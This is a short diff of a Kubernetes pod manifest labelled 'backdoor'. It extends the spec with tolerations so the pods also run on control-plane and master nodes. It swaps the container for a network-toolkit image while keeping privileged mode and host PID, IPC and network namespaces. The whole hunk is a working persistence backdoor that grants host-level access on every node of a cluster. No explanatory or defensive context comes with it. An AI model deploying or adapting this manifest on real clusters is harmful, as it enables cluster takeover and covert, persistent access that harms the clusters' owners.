@@ -12,13 +12,20 @@ spec:
       labels:
         app: backdoor
     spec:
+      tolerations:
+      - key: node-role.kubernetes.io/control-plane
+        operator: Exists
+        effect: NoSchedule
+      - key: node-role.kubernetes.io/master
+        operator: Exists
+        effect: NoSchedule
       hostIPC: true
       hostPID: true
       hostNetwork: true
       containers:
-      - name: alp
-        image: alpine:3.8
-        command: ["/bin/sh", "-c", "while true; do sleep 1; done" ]
+      - name: backdoor
+        image: nicolaka/netshoot
+        command: ["/bin/sh", "-c", "while true; do sleep 1000; done" ]
         securityContext:
           privileged: true
         volumeMounts:
